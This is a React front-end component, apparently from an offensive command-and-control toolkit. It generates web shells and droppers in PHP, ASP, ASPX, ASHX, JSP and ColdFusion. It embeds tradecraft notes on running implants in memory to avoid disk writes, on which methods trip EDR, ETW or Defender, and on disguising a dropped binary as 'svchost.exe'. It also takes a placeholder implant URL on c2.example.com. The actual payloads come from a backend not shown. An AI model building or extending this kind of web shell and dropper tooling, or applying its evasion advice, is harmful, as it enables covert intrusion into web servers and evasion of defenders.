import { useState } from 'react'
import { api } from '../lib/api'
import { copyText } from '../lib/clipboard'

function b64Decode(s: string) { try { return atob(s) } catch { return s } }

type Format = 'php' | 'asp' | 'aspx' | 'ashx' | 'jsp' | 'cfm'
type Mode = 'webshell' | 'dropper'
type ExecMethod = 'disk' | 'memory'

const tradecraft: Record<string, Record<Format, string>> = {
  disk: {
    php: 'Downloads implant to /tmp/{binaryName} and executes via popen(). CAUTION: Binary is written to disk and visible to file-based EDR scanning. The file persists after execution \u2014 consider cleanup.',
    asp: 'Downloads implant via MSXML2.ServerXMLHTTP and saves to disk. CAUTION: Triggers Windows Defender real-time scanning on file write. Binary is visible in the file system and process list.',
    aspx: 'Downloads implant via WebClient and executes via Process.Start(). CAUTION: .NET download + process creation generates ETW events. Binary persists on disk.',
    ashx: 'Downloads implant via WebClient and executes via Process.Start() from a generic IHttpHandler. CAUTION: Same ETW/on-disk footprint as ASPX; choose ASHX when the target exposes .ashx endpoints without the full Page pipeline.',
    jsp: 'Downloads implant via java.net.URL and writes to temp directory. CAUTION: Java process spawning a native binary is anomalous and may trigger EDR behavioral rules. Requires write access to temp directory.',
    cfm: 'Downloads implant via <cfhttp> and executes via <cfexecute>. CAUTION: ColdFusion process spawning external binaries is high-signal. Binary persists on disk.',
  },
  memory: {
    php: 'Executes implant in memory using proc_open() with stdin pipe. Requires PHP proc_open() to be enabled (often disabled in hardened configs). On Linux, uses /dev/stdin fd passing. No file written to disk.',
    asp: 'Pipes implant bytes to a shell process via ADODB.Stream + WScript.Shell.Exec stdin. CAUTION: Classic ASP has limited in-memory execution capabilities \u2014 this uses stdin piping which may not work for all implant types.',
    aspx: 'Loads implant using Assembly.Load(byte[]) for .NET payloads or VirtualAlloc/CreateThread via P/Invoke for native PE. Requires the implant to be a .NET assembly or shellcode. No file touches disk.',
    ashx: 'Loads implant using Assembly.Load(byte[]) inside an IHttpHandler. Requires a .NET assembly payload. No file touches disk. Identical tradecraft to ASPX in-memory; use when the target routes to .ashx.',
    jsp: 'Loads implant using ClassLoader.defineClass() from byte array. Requires the implant to be a Java class or JAR. For native binaries, falls back to stdin piping via ProcessBuilder. No file written to disk.',
    cfm: 'Uses Java\'s ClassLoader (ColdFusion runs on JVM) for Java payloads. CAUTION: Native binary in-memory execution is limited on ColdFusion \u2014 falls back to temp file with immediate deletion as best-effort.',
  },
}

export default function Generator() {
  const [mode, setMode] = useState<Mode>('webshell')
  const [format, setFormat] = useState<Format>('php')
  const [implantUrl, setImplantUrl] = useState('')
  const [binaryName, setBinaryName] = useState('')
  const [execMethod, setExecMethod] = useState<ExecMethod>('disk')
  const [result, setResult] = useState<{ fileName: string; authKey: string; content: string } | null>(null)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')

  async function generate() {
    setLoading(true)
    setError('')
    try {
      let res
      if (mode === 'dropper') {
        res = await api.generate(format, 'dropper', implantUrl, binaryName, execMethod === 'memory')
      } else {
        res = await api.generate(format)
      }
      setResult(res)
    } catch (e) {
      setError(String(e))
    } finally {
      setLoading(false)
    }
  }

  function download() {
    if (!result) return
    const blob = new Blob([b64Decode(result.content)], { type: 'text/plain' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = result.fileName
    a.click()
    URL.revokeObjectURL(url)
  }

  const canGenerate = mode === 'webshell' || (
    implantUrl.trim() !== '' && (execMethod === 'memory' || binaryName.trim() !== '')
  )

  return (
    <div className="p-4 max-w-2xl">
      <h2 className="text-sm font-semibold uppercase tracking-wide mb-4">
        {mode === 'dropper' ? 'Generate Dropper' : 'Generate Web Shell'}
      </h2>

      {/* Mode toggle */}
      <div className="flex gap-1 mb-4 bg-surface-input rounded-sm p-0.5 w-fit">
        {(['webshell', 'dropper'] as const).map((m) => (
          <button
            key={m}
            onClick={() => { setMode(m); setResult(null); setError('') }}
            className={`px-3 py-1 rounded-sm text-xs font-semibold ${
              mode === m ? 'bg-accent text-content-primary' : 'text-content-secondary hover:text-content-primary'
            }`}
          >
            {m === 'webshell' ? 'Web Shell' : 'Dropper'}
          </button>
        ))}
      </div>

      {/* Format buttons + generate */}
      <div className="flex flex-wrap gap-2 lg:gap-3 mb-4">
        {(['php', 'asp', 'aspx', 'ashx', 'jsp', 'cfm'] as const).map((f) => (
          <button
            key={f}
            onClick={() => setFormat(f)}
            className={`px-3 py-1 rounded-sm text-xs font-semibold uppercase ${
              format === f ? 'bg-accent text-content-primary' : 'bg-surface-input text-content-secondary hover:bg-surface-hover'
            }`}
          >
            {f}
          </button>
        ))}
        <button
          onClick={generate}
          disabled={loading || !canGenerate}
          className="ml-auto px-4 py-1.5 rounded-sm bg-accent-tertiary hover:bg-accent-tertiary-hover text-black text-xs font-semibold disabled:opacity-50"
        >
          {loading ? 'Generating...' : 'Generate'}
        </button>
      </div>

      {/* Dropper-specific inputs */}
      {mode === 'dropper' && (
        <div className="space-y-3 mb-4">
          <div>
            <label className="text-xs text-content-muted block mb-1">Implant URL</label>
            <input
              value={implantUrl}
              onChange={(e) => setImplantUrl(e.target.value)}
              placeholder="https://c2.example.com/implant.exe"
              className="w-full bg-surface-input text-xs px-2 py-1.5 rounded-sm border border-border"
            />
          </div>

          {/* Execution method toggle */}
          <div>
            <label className="text-xs text-content-muted block mb-1">Execution Method</label>
            <div className="flex gap-1 bg-surface-input rounded-sm p-0.5 w-fit">
              {(['disk', 'memory'] as const).map((m) => (
                <button
                  key={m}
                  onClick={() => setExecMethod(m)}
                  className={`px-3 py-1 rounded-sm text-xs font-semibold ${
                    execMethod === m ? 'bg-accent-secondary text-black' : 'text-content-secondary hover:text-content-primary'
                  }`}
                >
                  {m === 'disk' ? 'On Disk' : 'In-Memory'}
                </button>
              ))}
            </div>
          </div>

          {/* Binary name (disk only) */}
          {execMethod === 'disk' && (
            <div>
              <label className="text-xs text-content-muted block mb-1">Binary Name</label>
              <input
                value={binaryName}
                onChange={(e) => setBinaryName(e.target.value)}
                placeholder="svchost.exe"
                className="w-full bg-surface-input text-xs px-2 py-1.5 rounded-sm border border-border"
              />
            </div>
          )}

          {/* Tradecraft description */}
          <div className="bg-surface-card rounded p-3 border border-border">
            <p className="text-xs text-content-secondary">
              {tradecraft[execMethod][format]}
            </p>
          </div>
        </div>
      )}

      {error && <div className="text-semantic-error text-sm mb-4">{error}</div>}

      {result && (
        <div className="space-y-4">
          {/* Auth key */}
          <div className="bg-surface-card rounded p-3 border border-border">
            <div className="flex items-center justify-between mb-1">
              <span className="text-xs text-content-muted uppercase">Auth Key</span>
              <button onClick={() => copyText(result.authKey)} className="text-xs text-accent-secondary hover:text-accent-secondary-hover">
                Copy
              </button>
            </div>
            <code className="text-accent-tertiary text-sm break-all">{result.authKey}</code>
          </div>

          {/* File name */}
          <div className="bg-surface-card rounded p-3 border border-border">
            <div className="text-xs text-content-muted uppercase mb-1">File</div>
            <code className="text-accent-secondary text-sm">{result.fileName}</code>
          </div>

          {/* Content preview */}
          <div className="bg-surface-card rounded p-3 border border-border">
            <div className="flex items-center justify-between mb-2">
              <span className="text-xs text-content-muted uppercase">Content</span>
              <div className="flex gap-2">
                <button onClick={() => copyText(b64Decode(result.content))} className="text-xs text-accent-secondary hover:text-accent-secondary-hover">
                  Copy
                </button>
                <button onClick={download} className="text-xs text-accent-secondary hover:text-accent-secondary-hover">
                  Download
                </button>
              </div>
            </div>
            <pre className="text-xs text-content-secondary overflow-auto max-h-64 whitespace-pre-wrap">
              {b64Decode(result.content)}
            </pre>
          </div>
        </div>
      )}
    </div>
  )
}
